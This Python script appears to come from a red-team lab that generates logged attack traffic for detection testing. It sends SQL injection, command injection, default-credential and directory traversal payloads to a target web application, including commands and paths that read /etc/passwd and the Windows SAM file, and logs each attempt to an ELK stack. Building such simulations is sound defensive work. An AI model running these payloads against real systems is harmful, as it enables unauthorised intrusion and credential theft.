"""
Initial Access Scenario - Web Application Exploitation

Simulates common web application attacks including SQL injection,
command injection, and authentication bypass.
"""

import requests
import logging
import time
from datetime import datetime
from typing import Dict, Any
import json

# Setup logging to ELK
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger('red_team.initial_access')


class WebExploitScenario:
    """Simulates web application exploitation attacks."""
    
    def __init__(self, target_url: str, log_to_elk: bool = True):
        """
        Initialize scenario.
        
        Args:
            target_url: Target web application URL
            log_to_elk: Whether to log to ELK stack
        """
        self.target = target_url
        self.log_to_elk = log_to_elk
        self.scenario_id = "initial_access_web_exploit"
        
        if log_to_elk:
            self._setup_elk_logging()
    
    def _setup_elk_logging(self):
        """Setup logging to ELK stack via Logstash."""
        try:
            from logstash import TCPLogstashHandler
            
            logstash_handler = TCPLogstashHandler(
                host='localhost',
                port=5000,
                version=1
            )
            
            logger.addHandler(logstash_handler)
            logger.info("ELK logging configured")
            
        except ImportError:
            logger.warning("python-logstash not installed, logging to console only")
    
    def _log_attack(self, attack_type: str, payload: str, response: Dict[str, Any]):
        """
        Log attack details.
        
        Args:
            attack_type: Type of attack
            payload: Attack payload
            response: Response details
        """
        log_data = {
            'scenario_id': self.scenario_id,
            'red_team_activity': True,
            'attack_type': attack_type,
            'payload': payload,
            'target': self.target,
            'status_code': response.get('status_code'),
            'response_time': response.get('response_time'),
            'timestamp': datetime.now().isoformat()
        }
        
        logger.info(f"RED_TEAM ATTACK: {json.dumps(log_data)}")
    
    def sql_injection(self):
        """Simulate SQL injection attacks."""
        logger.info(f"SCENARIO_ID: {self.scenario_id} - Starting SQL injection")
        
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL, NULL, NULL --",
            "1' AND 1=1 --"
        ]
        
        for payload in payloads:
            try:
                start_time = time.time()
                
                response = requests.get(
                    f"{self.target}/login",
                    params={'username': payload, 'password': 'test'},
                    timeout=5
                )
                
                response_time = time.time() - start_time
                
                self._log_attack(
                    attack_type='sql_injection',
                    payload=payload,
                    response={
                        'status_code': response.status_code,
                        'response_time': response_time,
                        'content_length': len(response.content)
                    }
                )
                
                time.sleep(1)  # Rate limiting
                
            except Exception as e:
                logger.error(f"SQL injection failed: {e}")
    
    def command_injection(self):
        """Simulate command injection attacks."""
        logger.info(f"SCENARIO_ID: {self.scenario_id} - Starting command injection")
        
        payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(uname -a)",
            "; ls -la"
        ]
        
        for payload in payloads:
            try:
                start_time = time.time()
                
                response = requests.post(
                    f"{self.target}/search",
                    data={'query': payload},
                    timeout=5
                )
                
                response_time = time.time() - start_time
                
                self._log_attack(
                    attack_type='command_injection',
                    payload=payload,
                    response={
                        'status_code': response.status_code,
                        'response_time': response_time
                    }
                )
                
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"Command injection failed: {e}")
    
    def authentication_bypass(self):
        """Simulate authentication bypass attempts."""
        logger.info(f"SCENARIO_ID: {self.scenario_id} - Starting auth bypass")
        
        attempts = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': 'password'},
            {'username': 'root', 'password': 'root'},
            {'username': 'administrator', 'password': '123456'}
        ]
        
        for creds in attempts:
            try:
                start_time = time.time()
                
                response = requests.post(
                    f"{self.target}/login",
                    data=creds,
                    timeout=5
                )
                
                response_time = time.time() - start_time
                
                self._log_attack(
                    attack_type='authentication_bypass',
                    payload=json.dumps(creds),
                    response={
                        'status_code': response.status_code,
                        'response_time': response_time
                    }
                )
                
                time.sleep(2)
                
            except Exception as e:
                logger.error(f"Auth bypass failed: {e}")
    
    def directory_traversal(self):
        """Simulate directory traversal attacks."""
        logger.info(f"SCENARIO_ID: {self.scenario_id} - Starting directory traversal")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in payloads:
            try:
                start_time = time.time()
                
                response = requests.get(
                    f"{self.target}/download",
                    params={'file': payload},
                    timeout=5
                )
                
                response_time = time.time() - start_time
                
                self._log_attack(
                    attack_type='directory_traversal',
                    payload=payload,
                    response={
                        'status_code': response.status_code,
                        'response_time': response_time
                    }
                )
                
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"Directory traversal failed: {e}")
    
    def run(self):
        """Execute all attack scenarios."""
        logger.info(f"Starting scenario: {self.scenario_id}")
        logger.info(f"Target: {self.target}")
        
        try:
            # Run attack sequences
            self.sql_injection()
            time.sleep(2)
            
            self.command_injection()
            time.sleep(2)
            
            self.authentication_bypass()
            time.sleep(2)
            
            self.directory_traversal()
            
            logger.info(f"Scenario {self.scenario_id} completed")
            
        except Exception as e:
            logger.error(f"Scenario failed: {e}")


def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Initial Access - Web Exploitation Scenario"
    )
    parser.add_argument(
        '--target',
        type=str,
        default='http://vulnerable-app:8080',
        help='Target URL'
    )
    parser.add_argument(
        '--log-to-elk',
        action='store_true',
        help='Log to ELK stack'
    )
    
    args = parser.parse_args()
    
    scenario = WebExploitScenario(
        target_url=args.target,
        log_to_elk=args.log_to_elk
    )
    
    scenario.run()


if __name__ == "__main__":
    main()
